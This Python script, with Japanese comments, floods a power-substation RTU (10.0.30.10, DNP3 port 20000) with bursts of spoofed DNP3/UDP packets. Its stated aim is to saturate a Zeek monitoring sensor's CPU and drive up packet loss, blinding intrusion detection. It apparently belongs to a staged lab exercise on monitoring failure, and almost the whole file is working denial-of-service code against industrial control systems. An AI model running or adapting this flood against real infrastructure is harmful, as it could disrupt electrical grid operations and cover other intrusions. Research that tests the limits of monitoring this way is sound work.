#!/usr/bin/env python3
"""
Step 3: Stage 4 パケット DoS ＆ 2大監視破綻誘発モジュール
(attack_stage4_flood.py)

目的:
1. 変電所B LAN (10.0.30.10) 宛てに大容量 DNP3/UDP パケットパニックストームを連続射出。
2. zeek_tap センサーの CPU を 90% 超へ飽和させ、コンテキストスイッチ高騰を引き起こす。
3. Zeek capture_loss.log のドロップ率 (percent_lost) を急増させ、破綻① (インフラ限界) ＆ 破綻② (因果関係消滅・時系列逆転) を再現。
"""

import socket
import sys
import time

TARGET_IP = "10.0.30.10"  # Target Substation B RTU IP
TARGET_PORT = 20000       # DNP3 Port
BURST_COUNT = 500         # Packets per burst iteration


def generate_dnp3_flood_payload() -> bytes:
    """偽装 DNP3 連射パケットペイロードの生成"""
    # DNP3 Header (0x0564) + Direct Operate command / Raw packet padding
    dnp3_header = bytes.fromhex("05641244010000000000")
    dummy_padding = b"DNP3_EXHAUSTION_STORM_ATTACK_PACKET_PAYLOAD_PADDING_" * 4
    return dnp3_header + dummy_padding


def run_stage4_flood(duration_sec: int = 5):
    print("=" * 70)
    print(f"[Phase 1-3 Step 3] Stage 4 Packet Flood DoS Execution ({duration_sec}s burst)...")
    print("=" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_dnp3_flood_payload()
    
    start_time = time.time()
    total_sent = 0

    print(f"[+] Injecting high-rate DNP3 packet storm to {TARGET_IP}:{TARGET_PORT}...")
    try:
        while time.time() - start_time < duration_sec:
            for _ in range(BURST_COUNT):
                try:
                    sock.sendto(payload, (TARGET_IP, TARGET_PORT))
                    total_sent += 1
                except Exception:
                    pass
            time.sleep(0.01)  # High frequency pulse
    except KeyboardInterrupt:
        print("\n[!] Flood interrupted by user.")
    finally:
        sock.close()

    elapsed = time.time() - start_time
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"\n[+] Stage 4 Burst Completed:")
    print(f"      -> Total Sent Packets : {total_sent}")
    print(f"      -> Elapsed Time       : {elapsed:.2f} s")
    print(f"      -> Injection Rate     : {rate:.1f} pkt/sec")
    print("      [OK] Stage 4 DoS Exhaustion Packet Burst Delivered!")
    print("=" * 70)


if __name__ == "__main__":
    dur = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    run_stage4_flood(dur)
